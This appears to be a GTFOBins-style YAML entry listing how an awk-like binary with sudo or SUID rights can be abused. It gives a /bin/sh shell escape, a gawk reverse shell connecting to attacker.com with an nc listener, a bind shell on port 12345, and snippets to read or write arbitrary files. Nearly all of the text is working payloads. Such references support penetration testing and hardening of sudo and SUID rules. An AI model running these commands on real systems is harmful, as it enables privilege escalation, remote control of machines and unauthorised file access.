---
functions:
  execute:
    features:
      - interactive
      - sudo-enabled
      - suid-enabled
    examples:
      - code: BINARY 'BEGIN {system("/bin/sh")}'
  reverse-shell:
    features:
      - non-interactive
      - sudo-enabled
      - suid-enabled
    examples:
      - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
        code: |
          RHOST=attacker.com
          RPORT=12345
          BINARY -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
              s = "/inet/tcp/0/" RHOST "/" RPORT;
              while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
              while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  bind-shell:
    features:
      - non-interactive
      - sudo-enabled
      - suid-enabled
    examples:
      - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
        code: |
          LPORT=12345
          BINARY -v LPORT=$LPORT 'BEGIN {
              s = "/inet/tcp/" LPORT "/0/0";
              while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
              while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  file-read:
    features:
      - sudo-enabled
      - suid-enabled
    examples:
      - code: |
          LFILE=file_to_read
          BINARY '//' "$LFILE"
  file-write:
    features:
      - sudo-enabled
      - suid-enabled
    examples:
      - code: |
          LFILE=file_to_write
          BINARY -v LFILE=$LFILE 'BEGIN { print "data" > LFILE }'
---
